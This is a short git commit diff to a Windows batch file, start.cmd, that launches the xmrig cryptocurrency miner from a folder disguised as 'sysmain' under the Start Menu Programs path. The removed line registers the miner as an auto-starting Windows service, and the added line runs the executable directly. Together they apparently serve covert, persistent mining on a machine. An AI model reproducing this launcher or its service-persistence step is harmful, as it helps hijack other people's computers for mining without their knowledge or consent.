c7100ada044863df0552b94e132eae8279308887
mazarra <77664502+mazarra@users.noreply.github.com>
2022-02-07 07:56:06 +0100

    Update start.cmd

--- start.cmd
+++ start.cmd
@@ -1,3 +1,3 @@
 @echo off
-sc create xmrig binPath="C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sysmain\xmrig.exe" start= auto
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sysmain\xmrig.exe"
 pause
